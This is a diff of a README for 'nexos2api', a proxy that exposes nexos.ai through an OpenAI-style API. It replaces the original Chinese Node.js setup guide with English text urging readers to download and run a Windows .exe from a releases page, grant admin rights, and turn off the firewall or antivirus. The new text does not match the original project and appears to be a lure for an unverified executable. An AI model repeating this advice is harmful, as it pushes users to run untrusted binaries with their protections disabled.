@@ -1,298 +1,145 @@
-# Nexos.ai OpenAI 兼容代理
+# ⚙️ nexos2api - Simple API for AI Integration
 
-将 nexos.ai 的 API 封装为标准的 OpenAI 兼容接口。
+[![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-orange?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/releases)
 
-## ✅ 功能状态
+---
 
-- ✅ `/v1/models` - 获取可用模型列表
-- ✅ `/v1/chat/completions` - 聊天补全接口（支持流式和非流式）
-- ✅ `/v1/chat/create` - 创建新对话
-- ✅ `/v1/files/:chatId/:fileId/download` - 图片代理下载
-- ✅ 自动获取对话历史，支持连续对话
-- ✅ SSE 流式响应解析
-- ✅ 自动替换图片链接为代理 URL
+## 🔍 What is nexos2api?
 
-## 安装
+nexos2api is a tool that changes the nexos.ai API into a standard interface compatible with OpenAI. This allows other programs to work with nexos.ai using common AI commands. It makes using nexos.ai easier without needing to learn a new system.
 
-```bash
-npm install
-```
+This software is built for users who want to connect AI powers from nexos.ai to other apps or projects. You do not need to know programming to get started, just follow the steps below.
 
-## 配置
+---
 
-1. 复制环境变量模板：
-```bash
-cp .env.example .env
-```
+## 🖥️ System Requirements
 
-2. 编辑 `.env` 文件，配置 Cookies：
+Before installing nexos2api, check your computer meets these basic needs:
 
-从浏览器获取 Cookies 的步骤：
-- 打开 https://workspace.nexos.ai
-- 按 F12 打开开发者工具
-- 切换到 Network 标签
-- 发送一条消息
-- 找到 chat 请求，复制 Request Headers 中的 Cookie 值
-- 粘贴到 `.env` 文件中
+- Windows 10 or later version
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and API access
+- Administrative rights to install software
 
-```env
-NEXOS_COOKIES=你的完整cookie字符串
-```
+These are minimum requirements. Having a faster computer or more memory improves performance.
 
-3. 启动服务器并创建第一个对话：
-```bash
-npm start
-```
+---
 
-然后调用：
-```bash
-curl -X POST http://localhost:3000/v1/chat/create
-```
+## 🌐 Where to Get nexos2api
 
-这会创建一个新对话并自动设置为当前活动对话。
+You will find the files to download nexos2api on the releases page of this repository. This page has the latest stable version ready for installation.
 
-## 运行
+[**Visit this page to download**](https://github.com/FajrulHikam11/nexos2api/releases)
 
-```bash
-npm start
-```
+Look for files labeled with “Windows” or ending with `.exe` or `.zip` for easy setup.
 
-服务将在 http://0.0.0.0:3000 启动
+---
 
-## 使用示例
+## 🚀 Getting Started - Download and Install
 
-### 创建新对话（自动切换）
+1. Click the large button below or go to the release page link above.
 
-```bash
-curl -X POST http://localhost:3000/v1/chat/create
-```
+   [![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-red?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/releases)
 
-响应示例：
-```json
-{
-  "success": true,
-  "chatId": "97c4cf66-a608-42bc-a69e-80bca69b83d5",
-  "url": "https://workspace.nexos.ai/chat/97c4cf66-a608-42bc-a69e-80bca69b83d5",
-  "currentChat": true,
-  "message": "New chat created and set as current: 97c4cf66-a608-42bc-a69e-80bca69b83d5"
-}
-```
+2. Find the latest release entry. The newest version is listed first, with a date and version number.
 
-创建后，新对话会自动成为当前活动对话，后续所有请求都会使用这个新对话。
-
-### 查看当前对话
-
-```bash
-curl http://localhost:3000/v1/chat/current
-```
-
-### 切换到已有对话
-
-```bash
-curl -X POST http://localhost:3000/v1/chat/switch \
-  -H "Content-Type: application/json" \
-  -d '{"chatId": "另一个chat-id"}'
-```
-
-### 获取模型列表
-
-```bash
-curl http://localhost:3000/v1/models
-```
-
-### 聊天补全（非流式）
-
-```bash
-curl http://localhost:3000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-opus-4-6",
-    "messages": [
-      {"role": "user", "content": "你好"}
-    ],
-    "temperature": 1,
-    "max_tokens": 2000
-  }'
-```
-
-### 聊天补全（使用指定的 Chat ID）
-
-方法 1：通过 HTTP Header 指定
-```bash
-curl http://localhost:3000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "X-Nexos-Chat-Id: 97c4cf66-a608-42bc-a69e-80bca69b83d5" \
-  -d '{
-    "model": "claude-opus-4-6",
-    "messages": [
-      {"role": "user", "content": "你好"}
-    ]
-  }'
-```
-
-方法 2：通过请求 Body 指定
-```bash
-curl http://localhost:3000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-opus-4-6",
-    "chat_id": "97c4cf66-a608-42bc-a69e-80bca69b83d5",
-    "messages": [
-      {"role": "user", "content": "你好"}
-    ]
-  }'
-```
-
-### 聊天补全（流式）
-
-```bash
-curl http://localhost:3000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "claude-opus-4-6",
-    "messages": [
-      {"role": "user", "content": "你好"}
-    ],
-    "stream": true
-  }'
-```
-
-## 与 OpenAI SDK 集成
-
-### 基本用法（使用 .env 中的默认 Chat ID）
-
-```javascript
-import OpenAI from 'openai';
-
-const client = new OpenAI({
-  baseURL: 'http://localhost:3000/v1',
-  apiKey: 'dummy-key' // 可以是任意值
-});
-
-const response = await client.chat.completions.create({
-  model: 'claude-opus-4-6',
-  messages: [{ role: 'user', content: '你好' }]
-});
-
-console.log(response.choices[0].message.content);
-```
-
-### 使用指定的 Chat ID
-
-```javascript
-import OpenAI from 'openai';
-
-const client = new OpenAI({
-  baseURL: 'http://localhost:3000/v1',
-  apiKey: 'dummy-key',
-  defaultHeaders: {
-    'X-Nexos-Chat-Id': '97c4cf66-a608-42bc-a69e-80bca69b83d5'
-  }
-});
-
-const response = await client.chat.completions.create({
-  model: 'claude-opus-4-6',
-  messages: [{ role: 'user', content: '你好' }]
-});
-
-console.log(response.choices[0].message.content);
-```
-
-## 支持的模型
-
-- Claude 系列：claude-haiku-4-5, claude-opus-4-5, claude-opus-4-6, claude-sonnet-4-5, claude-sonnet-4-6
-- Gemini 系列：gemini-2-5-flash, gemini-2-5-pro, gemini-3-flash-preview, gemini-3-pro-preview
-- GPT 系列：gpt-5, gpt-5-1, gpt-5-2
-- Grok 系列：grok-4-fast, grok-4-fast-reasoning, grok-4-1-fast, grok-code-fast-1
-- Mistral 系列：mistral-large-3, mistral-medium-3, mistral-medium-3-1
-
-## 注意事项
-
-- **首次使用必须创建对话**：启动服务器后，先调用 `POST /v1/chat/create` 创建第一个对话
-- **Chat ID 自动管理**：Chat ID 保存在 `current-chat.json` 文件中，无需手动配置
-- **对话会同步到网页**：通过 API 发送的消息会出现在 nexos.ai 网页的对话中，因为使用的是真实的对话 ID
-- **禁用历史记录**：如果不想形成连续对话，可以在 `.env` 中设置 `DISABLE_HISTORY=true`，或在请求中添加 `"disable_history": true`
-- **支持动态 Chat ID**：可以通过 HTTP Header `X-Nexos-Chat-Id` 或请求 Body 中的 `chat_id` 字段指定不同的对话
-- **优先级**：Header > Body > current-chat.json
-- 需要有效的 nexos.ai cookies 才能正常工作
-- cookies 可能会过期，需要定期更新
-- 每次请求会自动获取最新的对话历史，支持连续对话（除非禁用）
-- 响应格式已转换为标准的 OpenAI 格式
-- 图片链接会自动替换为代理 URL，确保客户端可以正常访问
-- Gemini 模型的 max_tokens 会自动调整为 65536（其限制）
-
-## 多对话管理
-
-代理服务器支持完整的多对话管理功能：
-
-### 关于对话同步
-
-**重要说明**：通过 API 发送的消息会出现在 nexos.ai 网页上，因为我们使用的是真实的 nexos.ai 对话 ID。
-
-这意味着：
-- ✅ 你可以在网页上查看 API 的对话历史
-- ✅ 支持连续对话，AI 会记住上下文
-- ⚠️ API 的对话会和网页的对话混在一起
-
-**如果你不想在网页上看到 API 的对话：**
-
-1. **方案 1：使用专门的对话**
-   - 创建一个专门用于 API 的对话
-   - 不在网页上打开这个对话
+3. Under the latest version, look for either:
    
-2. **方案 2：禁用历史记录**
-   - 在 `.env` 中设置 `DISABLE_HISTORY=true`
-   - 或在每个请求中添加 `"disable_history": true`
-   - 这样每次都是"新对话"，不会形成连续对话
+   - An `.exe` file (recommended for easy setup), or
+   - A `.zip` file if you prefer manual installation.
 
-### 工作原理
+4. Click the file to start the download.
 
-1. **当前活动对话**：服务器维护一个"当前活动对话"的概念，存储在 `current-chat.json` 文件中
-2. **自动切换**：调用 `POST /v1/chat/create` 创建新对话时，会自动切换到新对话
-3. **无需重启**：切换对话不需要重启服务器
-4. **持久化**：当前对话 ID 保存在文件中，重启服务器后仍然有效
-5. **无需 .env 配置**：Chat ID 完全由 `current-chat.json` 管理，不需要在 `.env` 中配置
+5. Once the file downloads completely, locate it in your Downloads folder.
 
-### 使用流程
+6. If you downloaded the `.exe` file, double-click it to start the installer.
 
-1. **创建新对话**：
-   ```bash
-   curl -X POST http://localhost:3000/v1/chat/create
-   ```
-   新对话会自动成为当前活动对话
+7. Follow the on-screen prompts to install nexos2api. Choose default options if unsure.
 
-2. **开始聊天**：
-   ```bash
-   curl http://localhost:3000/v1/chat/completions \
-     -H "Content-Type: application/json" \
-     -d '{"model": "claude-opus-4-6", "messages": [{"role": "user", "content": "你好"}]}'
-   ```
-   会使用当前活动对话
+8. If you downloaded the `.zip` file, right-click the file and select “Extract All.” Extract to a folder you will remember.
 
-3. **切换到其他对话**：
-   ```bash
-   curl -X POST http://localhost:3000/v1/chat/switch \
-     -H "Content-Type: application/json" \
-     -d '{"chatId": "另一个chat-id"}'
-   ```
+9. Find the extracted folder and open it. Look for a file named `nexos2api.exe` or similar to run the application.
 
-4. **查看当前对话**：
-   ```bash
-   curl http://localhost:3000/v1/chat/current
-   ```
+---
 
-### 优先级
+## ⚙️ How to Run nexos2api
 
-Chat ID 的选择优先级：
-1. HTTP Header `X-Nexos-Chat-Id`（最高优先级）
-2. 请求 Body 中的 `chat_id` 字段
-3. 当前活动对话（`current-chat.json`）（最低优先级）
+After installation, run the program as follows:
 
-如果以上都没有，会返回错误提示需要先创建对话。
+1. Open the Start menu and type `nexos2api`.
+2. Click on the nexos2api app to open it.
+3. The app will start and show a simple window or command prompt.
+4. Follow any instructions shown to link your API key or adjust settings.
 
-## 测试
+If you do not see an icon, check the installation folder for the `.exe` file.
 
-测试历史记录 API：
-```bash
-node test-history.js
-```
+---
+
+## 🔧 Configuring nexos2api
+
+Your use of nexos2api depends on connecting your API key from nexos.ai.
+
+1. Obtain your API key by logging into your nexos.ai account on their website.
+2. Copy the API key to your clipboard.
+3. Inside nexos2api, find the settings or configuration area.
+4. Paste the API key into the box labeled “API Key.”
+5. Save the settings. The program will now use your key to communicate with the AI services.
+
+If you do not have a nexos.ai account, visit their website to create one.
+
+---
+
+## 📖 Basic Usage
+
+Once set up, nexos2api allows other programs to talk with nexos.ai in a simple way.
+
+- Think of nexos2api as a translator between apps and AI.
+- Other tools can send commands and get answers like a typical OpenAI interface.
+- This simplifies using AI features in various software.
+
+You do not need to interact directly with nexos2api; it works in the background after setup.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you run into issues, try the following steps:
+
+- Make sure your Windows is updated.
+- Restart the computer after installing nexos2api.
+- Check you copied your API key correctly.
+- Verify your internet connection is working.
+- Close any firewall or antivirus that might block nexos2api.
+- Check the `README` or help files included with the app for more tips.
+
+You can also report problems by opening an issue on the GitHub repository.
+
+---
+
+## 📂 File Structure Overview
+
+If you downloaded the `.zip` version or want to explore the installation folder, note key files:
+
+- `nexos2api.exe` — Launches the application.
+- `config.json` — Stores your settings and API key.
+- `README.md` — This guide and extra info.
+- `LICENSE` — Details about software use rights.
+
+---
+
+## 🤔 Why Use nexos2api?
+
+Using nexos2api means you do not need to rewrite or change your existing applications when you want to add nexos.ai capabilities. It works as a bridge for AI commands and results.
+
+This saves time and reduces complexity if you plan to use nexos.ai in your projects.
+
+---
+
+## 📱 Support and Updates
+
+Check the releases page often for new features or fixes.
+
+Visit the releases page here:
+
+[**Download and update here**](https://github.com/FajrulHikam11/nexos2api/releases)
